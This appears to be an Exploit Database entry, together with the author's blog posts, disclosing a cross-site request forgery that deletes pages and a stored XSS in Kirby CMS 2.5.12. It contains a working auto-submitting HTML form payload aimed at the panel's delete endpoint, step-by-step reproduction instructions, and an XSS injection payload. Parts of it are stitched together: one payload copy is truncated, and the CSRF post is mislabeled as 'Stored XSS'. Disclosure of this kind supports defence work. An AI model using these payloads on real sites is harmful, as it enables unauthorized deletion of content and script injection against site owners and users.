# Exploit Title:​​ Kirby CMS 2.5.12 - Cross-Site Request Forgery (Delete Page)
# Date: 2018-07-22
# Exploit Author: Zaran Shaikh
# Version: 2.5.12
# CVE: NA
# Category: Web Application

# 1. Description
# The application allows malicious HTTP requests to be sent in order to
# trick a user into adding/ deleting web pages.

# 2. Proof of Concept

1. Visit the application
2. Go to add page option
3. Create a crafted HTTP page with delete/ add option and host it on
a server. Upon sending the link to a user and upon click, it gets triggered
and the page is added/deleted
4. Payload:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/kirby/panel/pages/csrf-test-page/delete">
      <input type="hidden" name="&#95;redirect" value="site&#47;subpages" />
      <input type="submit" value="Submit request" />
    </form>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### [Cross Site Request Forgery - Kirby CMS](http://zaranshaikh.blogspot.com/2018/07/cross-site-request-forgery-kirby-cms.html)

Cross Site Request Forgery - Kirby CMS

By- Zaran Shaikh

Hi Readers,

Welcome to my blog. I am a inquisitive learner in the world of Cyber Security and will love to share my research and other stuff in coming time.

Since a while I have been fascinated with the concept of 0 days and started learning more on the topic. While coming across open source applications, I decided to explore Kirby CMS. I found multiple vulnerabilities in it, of which I am mentioning about Cross Site Request Forgery.

Title of the Vulnerability:  Stored XSS

Vulnerability Class: Web Application Exploits.

**Technical Details & Description**: The application allows malicious HTTP requests to be sent in order to trick a user into adding/ deleting web pages.

CVE ID allocated: - Undisclosed.

**Product & Service Introduction**: Kirby CMS

**Steps to Re-Produce –**

1.       Visit the application

2.       Go to add page option

3.       Create a crafted HTTP page with delete/ add option and host it on a server. Upon sending the link to a user and upon click, it gets triggered and the page is added/deleted

4. Payload:

<html>

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://localhost/kirby/panel/pages/csrf-test-page/delete">

      <input type="hidden" name="&#95;redirect" value="site&#47;subpages" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      document.forms[0].submit();

    </script>

  </body>

</html>

**Exploitation Technique:** A attacker can inject perform severe actions including account takeover.

**Severity Level**: High

**Security Risk:**

The presence of such a risk can lead to data loss,privilege escalation etc.

**Affected Product Version**:  Kirby 2.5.12

**Solution - Fix & Patch:** The application code should be configured to implement anti csrf tokens.

By- Zaran Shaikh

Hi Readers,

Welcome to my blog. I am a inquisitive learner in the world of Cyber Security and will love to share my research and other stuff in coming time.

Since a while I have been fascinated with the concept of 0 days and started learning more on the topic. While coming across open source applications, I decided to explore Kirby CMS. I found multiple vulnerabilities in it, of which I am mentioning about Stored Cross Site Scripting

**Title of the Vulnerability**:  Stored XSS
**Vulnerability Class**: Web Application Exploits.

**Technical Details & Description**: The application allows user injected payload which can lead to Stored Cross Site Scripting.

CVE ID allocated: - Undisclosed.

Product & Service Introduction: Kirby CMS

Steps to Re-Produce –
1.       Visit the application
2.       Go to add page option
3.       Under title, enter any XSS payload like: <script>alert("XSS");</script>
4.       Upon the payload being injected, the subsequent page is triggered with XSS.

**Exploitation Technique**: A attacker can inject malicious xss payloads to steal user data.
**Severity Level**: High
**Security Risk**:
The presence of such a risk can lead to data loss, xss shell uploads etc

**Affected Product Version**:  Kirby 2.5.12
**Solution - Fix & Patch**: The application code should be configured to implement strict input validation to prevent XSS payloads.
